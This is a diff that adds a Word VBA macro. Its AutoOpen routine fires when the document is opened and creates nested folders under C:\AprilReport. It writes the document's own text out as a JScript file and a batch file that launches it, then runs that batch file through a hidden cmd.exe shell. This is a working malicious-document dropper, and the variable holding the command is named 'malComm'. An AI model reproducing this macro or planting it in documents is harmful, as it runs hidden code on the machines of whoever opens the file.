@@ -1,0 +1,49 @@
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now >= DateAdd("s", n, t)
+End Sub
+Sub AutoOpen()
+'
+' AutoOpen Macro
+'
+'
+
+malComm = "C:\AprilReport\LogsTsg\LogsTsg7\LogsTsg8\List1.bat"
+
+MkDir "C:\AprilReport"
+MkDir "C:\AprilReport\LogsTsg"
+MkDir "C:\AprilReport\LogsTsg\LogsTsg7"
+MkDir "C:\AprilReport\LogsTsg\LogsTsg7\LogsTsg8"
+
+Dim fileName1 As String, textData1 As String, fileNo1 As Integer
+
+fileName1 = "C:\AprilReport\LogsTsg\LogsTsg7\LogsTsg8\List1.bat"
+
+fileNo1 = FreeFile
+
+Open fileName1 For Output As #fileNo1
+Print #fileNo1, "cscript //nologo C:\AprilReport\List1.jse"
+Close #fileNo1
+
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+Dim fileName As String, textData As String, fileNo As Integer
+
+fileName = "C:\AprilReport\List1.jse"
+
+fileNo = FreeFile
+
+Open fileName For Output As #fileNo
+Print #fileNo, ActiveDocument.Content.Text
+Close #fileNo
+
+Wait (2)
+
+Call Shell("cmd.exe /S /C" & malComm, vbHide)
+
+End Sub
